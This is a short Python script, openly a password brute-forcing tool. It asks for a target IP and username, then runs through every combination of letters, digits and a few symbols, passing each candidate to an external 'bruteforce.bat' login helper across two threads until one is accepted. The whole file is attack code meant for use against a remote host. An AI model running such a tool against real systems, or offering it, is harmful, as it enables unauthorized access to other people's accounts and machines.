import subprocess
import itertools
import threading

batch_file = 'bruteforce.bat'

chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', ',', '-', '_', ' ']
ip = input("ip: ")
user = input("username: ")

found = False
def check(combs):
    global found
    for combo in combs:
        if found == True:
            break
        comb = ''.join(combo)
        print(f'trying: {comb}')
        bat = subprocess.run([batch_file, ip, user, comb], text=True, capture_output=True)
        if bat.stdout.strip() == comb:
            print(f'password found: {comb}')
            found = True
            return comb
for r in range(1, len(chars) + 1):
    combinations = list(itertools.product(chars, repeat=r))
    n1 = round(len(combinations) / 2)
    comb1 = combinations[:n1]
    comb2 = combinations[n1:]
    t1 = threading.Thread(target=check, args=(comb1,))
    t2 = threading.Thread(target=check, args=(comb2,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    if found == True:
        break
# i use just two threads because more threads is too much for my computer
